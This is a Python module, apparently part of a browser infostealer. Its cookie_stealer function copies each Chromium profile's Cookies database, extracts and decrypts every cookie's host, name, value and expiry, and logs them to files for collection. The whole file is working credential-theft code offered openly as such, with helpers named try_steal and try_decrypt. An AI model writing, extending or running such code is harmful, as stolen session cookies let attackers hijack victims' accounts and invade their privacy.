""" IMPORTS """
import json
import sqlite3
from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt


"""
Tables of interest from SQLi Recon:
- cookies: contains all the cookie data
    - Columns of interest: host_key, path, name, encrypted_value, expires_utc
"""


@try_steal
def cookie_stealer(browser: dict, encryption_key: str) -> None:
    """ Steals cookies from a browser and places them into the logs directory """
    # Examine each profile
    profile_names = get_profiles(browser)
    for profile_name in profile_names:
        # Copy original sqlite3 database to access it without killing any active Chromium processes
        db_path = create_temp_file(browser, profile_name, 'Cookies')

        # Access sqlite3 database
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract encrypted cookies from database
        cursor.execute('SELECT host_key, path, name, encrypted_value, expires_utc FROM cookies')
        data = cursor.fetchall()

        # Decrypt cookies
        cookie_jar = [
            {
                'host_key': try_decrypt(host_key, encryption_key),
                'path': try_decrypt(path, encryption_key),
                'name': try_decrypt(name, encryption_key),
                'value': try_decrypt(encrypted_value, encryption_key),
                'expires_utc': try_decrypt(expires_utc, encryption_key),
            }
            for host_key, path, name, encrypted_value, expires_utc in data
        ]

        # Logs cookies
        if cookie_jar:
            log_file_name = profile_name + ' Cookies'
            log_data(cookie_jar, browser['name'], log_file_name)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()
